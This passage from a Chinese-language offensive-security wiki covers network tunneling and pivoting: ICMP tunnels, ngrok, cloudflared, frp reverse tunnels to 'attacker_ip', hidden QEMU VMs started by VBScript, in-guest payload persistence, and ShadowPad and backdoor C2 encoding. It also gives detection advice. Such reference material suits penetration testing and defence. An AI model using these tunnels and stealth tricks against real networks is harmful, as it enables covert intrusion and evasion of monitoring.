```

• Requests 使用 `DnsQuery()` 查询 **TXT**（并以 **MG** records 作为 fallback）。
• 当 response 超过 0xFF bytes 时，backdoor 会将数据 **fragments** 成 63-byte pieces，并插入以下 markers：
`s<SessionID>t<TOTAL>p<POS>`，以便 C2 server 重新排序。

2. **HTTP mode (AK47HTTP)**
• 构建一个 JSON envelope：
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 整个 blob 经 XOR-`VHBD@H` → hex → 作为 **`POST /`** 的 body 发送，并使用 header `Content-Type: text/plain`。
• reply 遵循相同的 encoding，`cmd` 字段通过 `cmd.exe /c <command> 2>&1` 执行。

Blue Team notes
• 查找异常的 **TXT queries**：其 first label 为较长的 hexadecimal，并且始终以某个少见 domain 结尾。
• 固定 XOR key 后跟 ASCII-hex，很容易通过 YARA 检测：`6?56484244?484`（`VHBD@H` 的 hex）。
• 对于 HTTP，标记 body 为纯 hex 且长度为 two bytes 倍数的 text/plain POST。

{{#note}}
该 channel 会将每个 sub-domain label 保持在 63-octet DNS limit 以内，但仅符合 protocol 并不会使其具备 stealth；rare domains、long hexadecimal labels 和 query volume 仍然是 detection signals。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans 介绍了一种使用 TUN device 和 ICMP echo requests 的 IPv4-over-ICMP tunnel；该 setup 要求具备足以创建 interface 的 privileges。<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ng 通过 ICMP 传输 TCP 连接，并使用下面显示的 `-p`、`-l`、`-r` 和 `-R` 选项分别指定 proxy、本地 listener、目标主机和目标端口。<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) 是一个通过安全隧道将本地网络服务发布到 Internet 的 agent；其 CLI 文档介绍了 HTTP、TCP 和 file URL endpoints，且输出的 endpoint 主机名可能因 endpoint 和 account 而有所不同。<sup>[[39]](#references)</sup>

### 安装

- 创建 account：https://ngrok.com/signup
- Client 下载：
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent 也支持在需要时使用 authentication 和 TLS 选项。<sup>[[39]](#references)</sup>_

#### TCP 隧道传输
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 使用 HTTP 暴露文件
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_适用于 XSS、SSRF、SSTI 等场景..._\
独立 agent 默认在 `http://127.0.0.1:4040` 暴露其 HTTP inspection interface；该 interface 用于 HTTP 流量。<sup>[[40]](#references)</sup>

#### Tunneling internal HTTP service

`--host-header=rewrite` 选项会重写上游 HTTP `Host` header，使其匹配本地 service。<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 简单配置示例

此配置使用 ngrok Agent Config v2；命名 tunnel 使用 `proto` 和 `addr`，并通过 `ngrok start` 启动。<sup>[[42]](#references)</sup> 它会打开 3 个 tunnel：

- 2 个 TCP
- 1 个 HTTP，从 /tmp/httpbin/ 暴露静态文件
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel 的 `cloudflared` connector 建立出站连接；已发布的应用可以路由 HTTP、HTTPS、TCP、SSH 和 RDP，而 quick tunnels 适用于 HTTP 开发。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel 单行命令
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 源站（legacy 模式）

legacy `--socks5` flag 告诉 `cloudflared` 本地源站使用 SOCKS5；它不会创建本地 SOCKS5 listener。对于 managed tunnel，`originRequest.proxyType: socks` 用于配置 SOCKS5 源站处理。<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### 使用 DNS 的持久化 tunnel

本地管理的 tunnel 配置使用小写的 `tunnel`、`credentials-file` 和 `url` 键，如下所示。<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
启动连接器：
```bash
cloudflared tunnel run mytunnel
```
该 connector 建立出站连接，默认协商 QUIC，失败时回退到 HTTP/2；不要假设每个部署都使用 TCP/443。运行它时，仅授予部署所需的权限。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) 是一个 Go reverse proxy，支持 **TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX 和 XTCP**。XTCP 使用 P2P hole punching，其成功与否取决于 NAT。从 **v0.53.0** 开始，它可以作为 **SSH Tunnel Gateway**，因此目标主机无需 `frpc` binary 即可使用自带的 OpenSSH client。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 经典 reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 使用新的 SSH 网关（无 frpc binary）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上述命令使用标准 OpenSSH client 将受害者的 **8080** 端口发布为 **attacker_ip:9000**，同时由 `frps` 提供网关。<sup>[[50]](#references)</sup>

## 使用 QEMU 的隐蔽基于 VM 的 Tunnels

QEMU 用户模式网络不要求为虚拟网络提供 root 或 administrator 权限，`-netdev user,hostfwd=...` 会将来自主机的 TCP、UDP 或 UNIX 连接重定向到 guest。<sup>[[51]](#references)</sup> TrustedSec 记录了一起事件：其中使用了 Tiny Core QEMU VM，并尝试建立 reverse SSH tunnel；在该事件中，面向主机的 EDR 可能无法发现 guest 内部的活动。<sup>[[1]](#references)</sup>

### 快速单行命令
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上述命令启动了一个具有 256 MiB 客体内存和 qcow2 磁盘映像的 **Tiny Core Linux** 客体；该磁盘映像不是内存中的磁盘。
• Windows 主机上的 **2222/tcp** 端口被透明转发到客体内部的 **22/tcp**。
• 从攻击者的角度看，目标仅暴露 2222 端口；所有到达该端口的数据包都由 VM 中运行的 SSH 服务器处理。

### 通过 VBScript 隐蔽启动

TrustedSec 在上述事件中观察到了由 VBS 驱动的 QEMU 启动过程和 Tiny Core 映像。<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
使用 `cscript.exe //B update.vbs` 运行脚本可使窗口保持隐藏状态。<sup>[[1]](#references)</sup>

### Guest 内持久化

所引用的事件描述了如何通过 `/opt/bootlocal.sh` 和 `/opt/filetool.lst` 在无状态 Tiny Core guest 中实现持久化：<sup>[[1]](#references)</sup>

1. 将 payload 写入 `/opt/123.out`
2. 追加到 `/opt/bootlocal.sh`：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，这样 payload 会在关机时被打包到 `mydata.tgz` 中。

### Telemetry 注意事项

• host 仍会暴露 QEMU 进程、qcow2 image 以及任何由 host 转发的 listener。
• 仅针对 host 的进程扫描可能不会检查 guest 进程，但 virtualization 并不能保证规避检测；network、QEMU 和 image telemetry 仍可能暴露它。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 建议

• 监控用户可写路径中的**异常 QEMU/VirtualBox/KVM binaries**。
• 阻止源自 `qemu-system*.exe` 的 outbound connections。
• 搜索罕见的 listening ports（2222、10022、……），尤其是它们在 QEMU 启动后立即绑定的情况。

## 通过 `HttpAddUrl` 构建 IIS/HTTP.sys relay nodes（ShadowPad）

Check Point 描述了 ShadowPad 的 IIS module 如何通过 `HttpAddUrl` 绑定 URL prefixes，将已入侵的 perimeter web servers 转变为 backdoor 和 relay nodes。<sup>[[3]](#references)</sup>

同一份报告详细介绍了 defaults、wildcard listeners、packet decryption、relay queues 和 debug telemetry，概要如下。<sup>[[3]](#references)</sup>

* **Config defaults** – 如果 module 的 JSON config 未提供相应值，则回退到看似可信的 IIS defaults（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）。这样，benign traffic 会由 IIS 使用正确的 branding 进行响应。
* **Wildcard interception** – operators 提供以分号分隔的 URL prefixes 列表（host + path 中包含 wildcards）。module 为每个条目调用 `HttpAddUrl`，因此 HTTP.sys 会将匹配的 requests 路由到 malicious handler；不匹配的 requests 则回退到正常的 IIS 行为。
* **Encrypted first packet** – request body 的前两个 bytes 携带 custom 32-bit PRNG 的 seed。在 protocol parsing 之前，后续每个 byte 都会与生成的 keystream 执行 XOR：

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module 维护两个 lists：“servers”（upstream nodes）和“clients”（downstream implants）。如果约 30 秒内没有 heartbeat 到达，则会清理相应 entries。当两个 lists 都非空时，它会将第一个 healthy server 与第一个 healthy client 配对，并在两者 sockets 之间直接传输 bytes，直到其中一侧关闭。
* **Debug telemetry** – 可选的 logging 会记录每个 pairing 的 source IP、destination IP 和 total forwarded bytes。调查人员利用这些 breadcrumbs 重建了横跨多个 victims 的 ShadowPad mesh。

---

## 要检查的其他 tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [隐藏于阴影之中：通过 QEMU Virtualization 构建 Covert Tunnels](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 之前：探索 Storm-2603 先前的 Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – 深入 Ink Dragon：揭示 Stealthy Offensive Operation 的 Relay Network 和内部运作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide：绕过 Firewall/IDS Restrictions](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：Metasploit 中的 Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale：来自 BOF-PE 的 CDN-Fronted Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
{{#include ../banners/hacktricks-training.md}}
